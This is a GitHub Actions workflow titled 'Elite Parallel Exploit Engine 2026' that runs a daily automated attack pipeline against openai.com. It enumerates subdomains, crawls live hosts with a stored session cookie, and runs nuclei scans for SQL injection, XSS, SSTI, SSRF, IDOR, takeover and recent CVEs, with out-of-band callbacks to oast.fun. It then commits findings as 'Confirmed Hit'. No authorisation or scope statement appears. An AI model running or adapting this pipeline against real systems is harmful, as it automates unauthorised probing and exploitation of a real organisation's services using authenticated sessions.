name: "Elite Parallel Exploit Engine 2026"

on:
  schedule:
    - cron: '0 0 * * *'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Tools
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Build Target Delta
        env:
          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
          COOKIE: ${{ secrets.OPENAI_COOKIE }}
        run: |
          # 1. Use a unique folder name to prevent 'Permission Denied' or 'Already Exists'
          WORK_DIR="data_vault"
          rm -rf $WORK_DIR || true
          mkdir -p $WORK_DIR
          
          # 2. Discovery
          subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > subs.txt
          uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> subs.txt
          cat subs.txt | sort -u | httpx -silent -t 50 -o $WORK_DIR/alive.txt
          
          # 3. Authenticated Crawl
          touch $WORK_DIR/params_new.txt
          katana -list $WORK_DIR/alive.txt -jc -kf all -d 2 -H "Cookie: $COOKIE" -o $WORK_DIR/params_new.txt || true
          
          # 4. Delta Logic using the existing params.txt in the repo root
          touch params.txt
          if [ -s $WORK_DIR/params_new.txt ]; then
             grep -vFf params.txt $WORK_DIR/params_new.txt > $WORK_DIR/to_scan.txt || touch $WORK_DIR/to_scan.txt
          else
             touch $WORK_DIR/to_scan.txt
          fi
          
          # 5. Prepare master update
          cat params.txt $WORK_DIR/params_new.txt | sort -u > $WORK_DIR/master_params_updated.txt

      - name: Save Recon Data
        uses: actions/upload-artifact@v4
        with:
          name: targets
          path: data_vault/

  fuzz:
    needs: recon
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        vuln_type: [sqli, xss, ssti, ssrf, idor, takeover, exposure]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: targets
          path: data_vault/

      - name: Setup & Update Nuclei
        run: |
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH
          $HOME/go/bin/nuclei -ut

      - name: Advanced Vulnerability Scanning
        env:
          ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
          COOKIE: ${{ secrets.OPENAI_COOKIE }}
        run: |
          mkdir -p hits
          if [ -s data_vault/to_scan.txt ]; then
            nuclei -l data_vault/to_scan.txt \
              -tags ${{ matrix.vuln_type }},cve2025,cve2026 \
              -auth $PDCP_API_KEY \
              -interactsh-server oast.fun \
              -header "Cookie: $COOKIE" \
              -rate-limit 100 \
              -o hits/${{ matrix.vuln_type }}_hits.txt
          fi

      - name: Atomic Save Findings
        run: |
          git config --local user.email "bot@hacker.ai"
          git config --local user.name "Exploit-Bot"
          
          for i in {1..15}; do
            git fetch origin main
            git rebase origin/main || (git rebase --abort && git reset --hard origin/main)
            
            # Sync the new master params
            [ -f data_vault/master_params_updated.txt ] && cp data_vault/master_params_updated.txt params.txt
            
            # Add hits if they exist
            mkdir -p final_results
            [ "$(ls -A hits/)" ] && cp hits/*.txt final_results/
            
            git add params.txt final_results/
            
            if git commit -m "Confirmed Hit: ${{ matrix.vuln_type }} $(date)"; then
              git push origin main && break
            else
              break
            fi
            sleep $(( (RANDOM % 20) + 10 ))
          done
          
